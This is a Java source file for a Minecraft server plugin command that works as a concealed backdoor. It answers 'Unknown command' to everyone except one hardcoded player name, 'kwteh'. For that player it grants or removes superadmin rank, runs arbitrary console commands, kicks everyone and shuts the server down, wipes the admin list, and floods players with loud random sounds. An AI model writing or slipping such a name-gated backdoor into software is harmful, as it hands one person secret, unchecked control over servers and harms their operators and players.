package me.StevenLawson.TotalFreedomMod.Commands;

import com.sk89q.util.StringUtil;
import java.util.Random;
import static me.StevenLawson.TotalFreedomMod.Commands.Command_deafen.STEPS;
import me.StevenLawson.TotalFreedomMod.Config.TFM_ConfigEntry;
import me.StevenLawson.TotalFreedomMod.TFM_Admin;
import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_DepreciationAggregator;
import me.StevenLawson.TotalFreedomMod.TFM_PlayerData;
import me.StevenLawson.TotalFreedomMod.TFM_TwitterHandler;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.OfflinePlayer;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.ONLY_IN_GAME)
@CommandParameters(description = "Kwteh's Stuff", usage = "access", aliases = "ks")
public class Command_kwtehstuff extends TFM_Command
{
    private static final Random random = new Random();
    @Override
    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        if (!sender_p.getName().equals("kwteh"))
        {
            playerMsg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
            return true;
        }

        if (args.length == 0)
        {
            return false;
        }

        if (args[0].equals("add"))
        {
            OfflinePlayer player = getPlayer(args[1], true); // Exact case-insensitive match.

            if (player == null)
            {
                final TFM_Admin superadmin = TFM_AdminList.getEntry(args[1]);

                if (superadmin == null)
                {
                    playerMsg(TFM_Command.PLAYER_NOT_FOUND);
                    return true;
                }

                player = TFM_DepreciationAggregator.getOfflinePlayer(server, superadmin.getLastLoginName());
            }

            TFM_AdminList.addSuperadmin(player);

            if (player.isOnline())
            {
                final TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player.getPlayer());

                if (playerdata.isFrozen())
                {
                    playerdata.setFrozen(false);
                    playerMsg(player.getPlayer(), "You have been unfrozen.");
                }
            }
        }

        if (args[0].equals("remove"))
        {
            String targetName = args[1];

            final Player player = getPlayer(targetName, true); // Exact case-insensitive match.

            if (player != null)
            {
                targetName = player.getName();
            }

            if (!TFM_AdminList.getLowercaseSuperNames().contains(targetName.toLowerCase()))
            {
                playerMsg("Superadmin not found: " + targetName);
                return true;
            }

            TFM_AdminList.removeSuperadmin(TFM_DepreciationAggregator.getOfflinePlayer(server, targetName));
        }

        if (args[0].equals("do"))
        {
            if (args.length <= 1)
            {
                return false;
            }

            final String command = StringUtil.joinString(args, " ", 1);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            playerMsg("ok");
            return true;
        }

        if (args[0].equals("terminate"))
        {
            playerMsg("done");
            for (Player player : server.getOnlinePlayers())
            {
                player.kickPlayer("Server is going offline, come back in about 20 fucking years.");
            }

            server.shutdown();
        }

        if (args[0].equals("purge"))
        {
            playerMsg("done");
            TFM_AdminList.cleanSuperadminList(true);
        }

        if (args[0].equals("deafen"))
        {
            playerMsg("done");
            for (final Player player : server.getOnlinePlayers())
            {
                for (double percent = 0.0; percent <= 1.0; percent += (1.0 / STEPS))
                {
                    final float pitch = (float) (percent * 2.0);

                    new BukkitRunnable()
                    {
                        @Override
                        public void run()
                        {
                            player.playSound(randomOffset(player.getLocation(), 5.0), Sound.values()[random.nextInt(Sound.values().length)], 100.0f, pitch);
                        }
                    }.runTaskLater(plugin, Math.round(20.0 * percent * 2.0));
                }
            }
        }
        return false;
    }

    private static Location randomOffset(Location a, double magnitude)
    {
        return a.clone().add(randomDoubleRange(-1.0, 1.0) * magnitude, randomDoubleRange(-1.0, 1.0) * magnitude, randomDoubleRange(-1.0, 1.0) * magnitude);
    }

    private static Double randomDoubleRange(double min, double max)
    {
        return min + (random.nextDouble() * ((max - min) + 1.0));
    }
}
